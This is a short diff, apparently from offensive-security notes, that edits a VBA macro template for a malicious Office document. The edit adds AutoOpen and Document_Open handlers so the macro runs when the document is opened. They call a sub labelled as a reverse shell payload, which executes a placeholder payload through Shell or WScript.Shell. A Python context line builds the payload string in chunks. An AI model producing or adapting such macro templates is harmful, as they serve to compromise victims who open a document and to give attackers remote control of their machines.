@@ -246,10 +246,19 @@ for i in range(0, len(str), n):
 print "Str = Str + " + '"' + str[i:i+n] + '"'
 
 # create VBA macro -> insert into Excel file
-Sub MyMacro()
-        Dim Str As String
+Sub AutoOpen()      # auto-exec macro when new doc is opened
+    exploit
+End Sub
+Sub Document_Open() # auto-exec macro when doc is re-opened
+    exploit
+End Sub
+Sub exploit()       # reverse shell payload
+        Dim str As String
         {insert_payload_here}
-        Shell (Str)
+        # OPTION 1
+        Shell (Str)                    
+        # OPTION 2
+        # CreateObject("Wscript.Shell").Run str
 End Sub
 ```
 
